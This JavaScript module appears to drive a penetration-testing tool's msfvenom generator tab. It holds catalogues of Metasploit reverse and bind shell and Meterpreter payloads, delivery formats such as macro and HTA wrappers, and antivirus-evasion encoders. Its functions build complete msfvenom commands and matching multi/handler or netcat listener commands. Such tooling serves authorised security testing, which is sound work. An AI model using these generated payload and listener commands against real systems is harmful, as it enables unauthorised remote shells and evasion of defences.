import { quoteShellArg } from '../utils/validation.js'

// MSFVenom payload data for the MSFVenom Generator tab
// Organized by categories for easy selection

// ─── Payload Templates ───────────────────────────────
export const MSFVENOM_PAYLOADS = {
  'Linux': {
    'Staged': [
      'linux/x86/shell/reverse_tcp',
      'linux/x86/meterpreter/reverse_tcp',
      'linux/x86/shell/bind_tcp',
      'linux/x86/meterpreter/bind_tcp',
      'linux/x64/shell/reverse_tcp',
      'linux/x64/meterpreter/reverse_tcp',
      'linux/x64/shell/bind_tcp',
      'linux/x64/meterpreter/bind_tcp',
    ],
    'Stageless': [
      'linux/x86/shell_reverse_tcp',
      'linux/x86/meterpreter_reverse_tcp',
      'linux/x86/shell_bind_tcp',
      'linux/x64/shell_reverse_tcp',
      'linux/x64/meterpreter_reverse_tcp',
      'linux/x64/shell_bind_tcp',
      'linux/x64/meterpreter_reverse_http',
      'linux/x64/meterpreter_reverse_https',
    ],
  },
  'Windows': {
    'Staged': [
      'windows/shell/reverse_tcp',
      'windows/meterpreter/reverse_tcp',
      'windows/meterpreter/reverse_http',
      'windows/meterpreter/reverse_https',
      'windows/shell/bind_tcp',
      'windows/meterpreter/bind_tcp',
      'windows/x64/shell/reverse_tcp',
      'windows/x64/meterpreter/reverse_tcp',
      'windows/x64/meterpreter/reverse_http',
      'windows/x64/meterpreter/reverse_https',
      'windows/x64/shell/bind_tcp',
      'windows/x64/meterpreter/bind_tcp',
    ],
    'Stageless': [
      'windows/shell_reverse_tcp',
      'windows/meterpreter_reverse_tcp',
      'windows/shell_bind_tcp',
      'windows/x64/shell_reverse_tcp',
      'windows/x64/meterpreter_reverse_tcp',
      'windows/x64/meterpreter_reverse_http',
      'windows/x64/meterpreter_reverse_https',
      'windows/x64/shell_bind_tcp',
    ],
  },
  'macOS': {
    'Staged': [
      'osx/x64/meterpreter/reverse_tcp',
      'osx/x64/meterpreter/bind_tcp',
    ],
    'Stageless': [
      'osx/x64/shell_reverse_tcp',
      'osx/x64/meterpreter_reverse_tcp',
      'osx/x64/shell_bind_tcp',
      'osx/x64/meterpreter_reverse_https',
    ],
  },
  'Web': {
    'PHP': [
      'php/meterpreter_reverse_tcp',
      'php/meterpreter/reverse_tcp',
      'php/reverse_php',
      'php/bind_php',
    ],
    'Java': [
      'java/jsp_shell_reverse_tcp',
      'java/shell_reverse_tcp',
      'java/meterpreter/reverse_tcp',
      'java/meterpreter/bind_tcp',
    ],
    'Python': [
      'python/meterpreter_reverse_tcp',
      'python/meterpreter/reverse_tcp',
      'python/shell_reverse_tcp',
      'python/meterpreter_reverse_https',
    ],
  },
  'Android': {
    'Meterpreter': [
      'android/meterpreter/reverse_tcp',
      'android/meterpreter/reverse_http',
      'android/meterpreter/reverse_https',
      'android/meterpreter_reverse_tcp',
      'android/shell/reverse_tcp',
    ],
  },
};

// ─── Output Formats ──────────────────────────────────
export const MSFVENOM_FORMATS = {
  'Executable': [
    { value: 'exe', label: 'exe (Windows PE)' },
    { value: 'exe-small', label: 'exe-small (Minimal PE)' },
    { value: 'exe-only', label: 'exe-only (No template)' },
    { value: 'exe-service', label: 'exe-service (Windows Service)' },
    { value: 'elf', label: 'elf (Linux ELF)' },
    { value: 'elf-so', label: 'elf-so (Shared Object)' },
    { value: 'macho', label: 'macho (macOS)' },
    { value: 'dll', label: 'dll (Windows DLL)' },
    { value: 'msi', label: 'msi (Windows Installer)' },
    { value: 'msi-nouac', label: 'msi-nouac (Windows Installer, no UAC)' },
    { value: 'osx-app', label: 'osx-app (macOS Application Bundle)' },
  ],
  'Web': [
    { value: 'asp', label: 'asp (Classic ASP)' },
    { value: 'aspx', label: 'aspx (ASP.NET)' },
    { value: 'aspx-exe', label: 'aspx-exe (ASPX Wrapper)' },
    { value: 'jsp', label: 'jsp (Java Server Pages)' },
    { value: 'war', label: 'war (Java WAR)' },
    { value: 'jar', label: 'jar (Java Archive)' },
    { value: 'axis2', label: 'axis2 (Axis2 Service)' },
  ],
  'Scripting': [
    { value: 'python', label: 'python (Python)' },
    { value: 'py', label: 'py (Python short)' },
    { value: 'bash', label: 'bash (Bash Script)' },
    { value: 'sh', label: 'sh (Shell Script)' },
    { value: 'powershell', label: 'powershell (PS1)' },
    { value: 'ps1', label: 'ps1 (PowerShell)' },
    { value: 'psh', label: 'psh (PowerShell)' },
    { value: 'psh-cmd', label: 'psh-cmd (PowerShell Command)' },
    { value: 'psh-net', label: 'psh-net (.NET PowerShell)' },
    { value: 'psh-reflection', label: 'psh-reflection (Reflection PowerShell)' },
    { value: 'hta-psh', label: 'hta-psh (HTA + PS)' },
    { value: 'vba', label: 'vba (Visual Basic App)' },
    { value: 'vba-exe', label: 'vba-exe (VBA Wrapper)' },
    { value: 'vba-psh', label: 'vba-psh (VBA + PS)' },
    { value: 'vbs', label: 'vbs (VBScript)' },
  ],
  'Transform': [
    { value: 'raw', label: 'raw (Raw Bytes)' },
    { value: 'hex', label: 'hex (Hex String)' },
    { value: 'c', label: 'c (C Buffer)' },
    { value: 'csharp', label: 'csharp (C# Buffer)' },
    { value: 'java', label: 'java (Java Buffer)' },
    { value: 'perl', label: 'perl (Perl Buffer)' },
    { value: 'ruby', label: 'ruby (Ruby Buffer)' },
    { value: 'rust', label: 'rust (Rust Buffer)' },
    { value: 'nim', label: 'nim (Nim Buffer)' },
    { value: 'base32', label: 'base32 (Base32)' },
    { value: 'base64', label: 'base64 (Base64)' },
    { value: 'num', label: 'num (Numeric)' },
  ],
};

// ─── Encoders ────────────────────────────────────────
export const MSFVENOM_ENCODERS = [
  { value: '', label: 'None (no encoder)' },
  { value: 'x86/shikata_ga_nai', label: 'x86/shikata_ga_nai (Polymorphic XOR)' },
  { value: 'x64/xor_dynamic', label: 'x64/xor_dynamic' },
  { value: 'x64/xor', label: 'x64/xor' },
  { value: 'x64/zutto_dekiru', label: 'x64/zutto_dekiru' },
  { value: 'x86/call4_dword_xor', label: 'x86/call4_dword_xor' },
  { value: 'x86/countdown', label: 'x86/countdown' },
  { value: 'x86/fnstenv_mov', label: 'x86/fnstenv_mov' },
  { value: 'x86/jmp_call_additive', label: 'x86/jmp_call_additive' },
  { value: 'x86/context_cpuid', label: 'x86/context_cpuid' },
  { value: 'x86/context_stat', label: 'x86/context_stat' },
  { value: 'x86/context_time', label: 'x86/context_time' },
  { value: 'x86/xor_dynamic', label: 'x86/xor_dynamic' },
  { value: 'cmd/powershell_base64', label: 'cmd/powershell_base64' },
  { value: 'php/base64', label: 'php/base64' },
  { value: 'ruby/base64', label: 'ruby/base64' },
];

// ─── Architectures ───────────────────────────────────
export const MSFVENOM_ARCHS = [
  { value: '', label: 'Auto-detect' },
  { value: 'x86', label: 'x86 (32-bit)' },
  { value: 'x64', label: 'x64 (64-bit)' },
  { value: 'aarch64', label: 'aarch64 (ARM 64)' },
  { value: 'armle', label: 'armle (ARM LE)' },
  { value: 'mipsbe', label: 'mipsbe (MIPS BE)' },
  { value: 'mipsle', label: 'mipsle (MIPS LE)' },
];

// ─── Platforms ───────────────────────────────────────
export const MSFVENOM_PLATFORMS = [
  { value: '', label: 'Auto-detect' },
  { value: 'windows', label: 'Windows' },
  { value: 'linux', label: 'Linux' },
  { value: 'osx', label: 'macOS' },
  { value: 'android', label: 'Android' },
  { value: 'php', label: 'PHP' },
  { value: 'java', label: 'Java' },
  { value: 'python', label: 'Python' },
];

const NATIVE_FORMATS = new Set([
  'exe', 'exe-small', 'exe-only', 'exe-service', 'dll', 'msi', 'msi-nouac',
  'elf', 'elf-so', 'macho', 'osx-app',
  'asp', 'aspx', 'aspx-exe', 'axis2', 'jsp', 'war', 'jar',
  'python', 'py', 'bash', 'sh', 'powershell', 'ps1', 'psh', 'psh-cmd',
  'psh-net', 'psh-reflection', 'hta-psh',
  'vba', 'vba-exe', 'vba-psh', 'vbs',
]);

const PLATFORM_FORMATS = {
  windows: new Set([
    'exe', 'exe-small', 'exe-only', 'exe-service', 'dll', 'msi', 'msi-nouac',
    'asp', 'aspx', 'aspx-exe', 'powershell', 'ps1', 'psh', 'psh-cmd',
    'psh-net', 'psh-reflection', 'hta-psh',
    'vba', 'vba-exe', 'vba-psh', 'vbs',
  ]),
  linux: new Set(['elf', 'elf-so', 'bash', 'sh']),
  osx: new Set(['macho', 'osx-app']),
  android: new Set([]),
  php: new Set([]),
  java: new Set(['axis2', 'jsp', 'war', 'jar']),
  python: new Set(['python', 'py']),
};

export function inferPayloadPlatform(payload = '') {
  const prefix = payload.split('/')[0];
  return prefix === 'osx' ? 'osx' : prefix;
}

export function inferPayloadArch(payload = '') {
  if (payload.includes('/x64/')) return 'x64';
  if (payload.includes('/x86/')) return 'x86';
  return '';
}

export function isFormatCompatible(payload, format) {
  if (!format || !NATIVE_FORMATS.has(format)) return true;
  const platform = inferPayloadPlatform(payload);
  return PLATFORM_FORMATS[platform]?.has(format) ?? true;
}

export function getMsfvenomCompatibilityErrors({
  payload,
  format,
  encoder,
  arch,
  platform,
}) {
  const errors = {};
  const inferredPlatform = inferPayloadPlatform(payload);
  const inferredArch = inferPayloadArch(payload);
  const encoderArch = encoder?.match(/^(x86|x64)\//)?.[1] || '';

  if (!isFormatCompatible(payload, format)) {
    errors.format = `${format} is not compatible with ${inferredPlatform || 'this'} payload`;
  }
  if (arch && inferredArch && arch !== inferredArch) {
    errors.arch = `Payload architecture is ${inferredArch}`;
  }
  if (platform && inferredPlatform && platform !== inferredPlatform) {
    errors.platform = `Payload platform is ${inferredPlatform}`;
  }
  if (encoderArch && inferredArch && encoderArch !== inferredArch) {
    errors.encoder = `${encoder} cannot encode a ${inferredArch} payload`;
  }

  return errors;
}

/**
 * Generate an msfvenom command string from the given options
 */
export function generateMsfvenomCommand({
  payload,
  ip,
  port,
  format,
  encoder,
  iterations,
  badChars,
  arch,
  platform,
  nops,
  outputFile,
}) {
  const parts = ['msfvenom'];

  // Payload
  parts.push(`-p ${payload}`);

  // LHOST / LPORT (detect direction from payload name)
  if (payload.includes('reverse') || payload.includes('meterpreter_reverse')) {
    parts.push(`LHOST=${quoteShellArg(ip || '10.10.10.10')}`);
    parts.push(`LPORT=${quoteShellArg(port || '4444')}`);
  } else if (payload.includes('bind')) {
    parts.push(`RHOST=${quoteShellArg(ip || '10.10.10.10')}`);
    parts.push(`LPORT=${quoteShellArg(port || '4444')}`);
  } else {
    parts.push(`LHOST=${quoteShellArg(ip || '10.10.10.10')}`);
    parts.push(`LPORT=${quoteShellArg(port || '4444')}`);
  }

  // Platform
  if (platform) {
    parts.push(`--platform ${platform}`);
  }

  // Architecture
  if (arch) {
    parts.push(`-a ${arch}`);
  }

  // Encoder
  if (encoder) {
    parts.push(`-e ${encoder}`);
  }

  // Iterations
  if (iterations && parseInt(iterations) > 1) {
    parts.push(`-i ${iterations}`);
  }

  // NOP sled
  if (nops && parseInt(nops) > 0) {
    parts.push(`-n ${nops}`);
  }

  // Bad characters
  if (badChars && badChars.trim()) {
    parts.push(`-b ${quoteShellArg(badChars.trim())}`);
  }

  // Format
  parts.push(`-f ${format || 'raw'}`);

  // Output file
  if (outputFile && outputFile.trim()) {
    parts.push(`-o ${quoteShellArg(outputFile.trim())}`);
  }

  return parts.join(' \\\n  ');
}

/**
 * Classify delivery and handler requirements encoded in a Metasploit payload
 * name. Staged payloads use slash-separated stage identifiers such as
 * shell/reverse_tcp, while stageless payloads use shell_reverse_tcp.
 */
export function getMsfvenomPayloadTraits(payload = '') {
  const direction = payload.includes('reverse')
    ? 'reverse'
    : payload.includes('bind')
      ? 'bind'
      : 'unknown';
  const isMeterpreter = /(?:^|\/)meterpreter(?:[/_]|$)/i.test(payload);
  const isStaged = /\/(?:shell|meterpreter)\/(?:reverse|bind)_[^/]+$/i.test(payload);

  return {
    direction,
    isMeterpreter,
    isStaged,
    requiresHandler: isStaged || isMeterpreter,
  };
}

/**
 * Get a listener command for an msfvenom payload
 */
export function getMsfvenomListener({ payload, ip, port }) {
  const traits = getMsfvenomPayloadTraits(payload);
  if (traits.requiresHandler) {
    let lines = [
      `msfconsole -q -x "`,
      'use exploit/multi/handler;',
      `set PAYLOAD ${payload};`,
    ];

    if (traits.direction === 'reverse') {
      lines.push(`set LHOST ${ip || '0.0.0.0'};`);
      lines.push(`set LPORT ${port || '4444'};`);
    } else if (traits.direction === 'bind') {
      lines.push(`set RHOST ${ip || '10.10.10.10'};`);
      lines.push(`set LPORT ${port || '4444'};`);
    }

    lines.push('run"')
    return lines.join('\n');
  }

  // A simple stageless command shell can be handled by Netcat.
  if (traits.direction === 'reverse') {
    return `nc -lvnp ${port || '4444'}`;
  }
  if (traits.direction === 'bind') {
    return `nc ${ip || '10.10.10.10'} ${port || '4444'}`;
  }
  return 'Review the selected payload documentation for its handler requirements.';
}
